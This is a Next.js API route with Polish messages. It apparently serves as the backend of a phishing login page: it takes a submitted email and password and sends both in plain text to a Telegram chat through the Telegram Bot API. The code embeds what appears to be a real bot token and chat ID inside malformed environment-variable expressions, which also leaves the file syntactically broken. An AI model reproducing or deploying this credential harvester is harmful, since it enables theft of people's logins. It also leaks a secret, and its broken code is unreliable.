import { NextResponse } from "next/server";

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { email, password } = body;

    const token = process.env.7585073634:AAGNcdfRkQivbLF6hd-hrbgDS_kqlQY-pDc;
    const chatId = process.env.5824672129;

    if (!token || !chatId) {
      return NextResponse.json({ error: "Brak konfiguracji" }, { status: 500 });
    }

    const message = `🔐 Nowe logowanie:\nEmail: ${email}\nHasło: ${password}`;

    const telegramRes = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      }
    );

    if (!telegramRes.ok) {
      return NextResponse.json({ error: "Telegram error" }, { status: 500 });
    }

    return NextResponse.json({ success: true });
  } catch (err) {
    return NextResponse.json({ error: "Server error" }, { status: 500 });
  }
}
